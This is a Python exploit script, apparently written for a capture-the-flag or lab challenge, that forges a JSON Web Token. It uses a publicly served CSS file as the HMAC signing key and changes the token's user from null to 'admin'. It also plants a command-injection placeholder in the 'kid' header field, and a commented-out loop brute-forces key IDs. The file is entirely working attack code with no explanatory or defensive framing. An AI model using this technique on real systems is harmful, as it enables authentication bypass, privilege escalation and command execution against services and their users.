import hmac
import hashlib
import base64
import binascii

def padding(part):
    if len(part) % 4 != 0:
        padding = 4- (len(part) % 4)
        return part + ("="*padding)
    return part

def sign(part, key):
    return base64.urlsafe_b64encode(hmac.new(key.encode(), part.encode(), hashlib.sha256).digest()).decode("utf-8").rstrip("=")

def createJWT(kid, header, body):
	header = header.replace("0001", str(kid))
	body = body.replace("null", "\"admin\"")
	payload = base64.urlsafe_b64encode(header.encode()).decode("utf-8").rstrip("=") + "." + base64.urlsafe_b64encode(body.encode()).decode("utf-8").rstrip("=")
	signature =  sign(payload, key)
	print(header)
	print(body)
	print(payload)
	print(signature)
	return base64.urlsafe_b64encode(header.encode()).decode("utf-8").rstrip("=") + "." + base64.urlsafe_b64encode(body.encode()).decode("utf-8").rstrip("=") + "." + signature

def decode(jwt):
	particles = jwt.split(".")
	header = base64.b64decode(padding(particles[0])).decode("utf-8")
	body = base64.b64decode(padding(particles[1])).decode("utf-8")
	return header +"." + body

public_key = open('bootstrap.css')
key = public_key.read()
orig_jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IjAwMDEifQ.eyJ1c2VyIjpudWxsfQ.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y"
particles = orig_jwt.split(".")
header = base64.b64decode(padding(particles[0])).decode("utf-8")
body = base64.b64decode(padding(particles[1])).decode("utf-8")

result = createJWT("\|command goes here", header, body)
print("---------")
print(result)
print(decode(result))
print("---------")


#for i in range(1,10):
#	kid = "%04d" % i
#	payload = base64.urlsafe_b64encode(header.encode()).decode("utf-8").rstrip("=") + "." + base64.urlsafe_b64encode(body.encode()).decode("utf-8").rstrip("=")
#	result = createJWT(kid, header, body)
#	print("---------")
#	print(result)
#	print(decode(result))
#	print("---------")




#header = base64.urlsafe_b64encode(header.encode()).decode("utf-8").rstrip("=")
#body = base64.urlsafe_b64encode(body.encode()).decode("utf-8").rstrip("=")

#payload = header + "." + body
#print(payload)

#signature = sign(payload, key)
#print(payload + "." + signature)
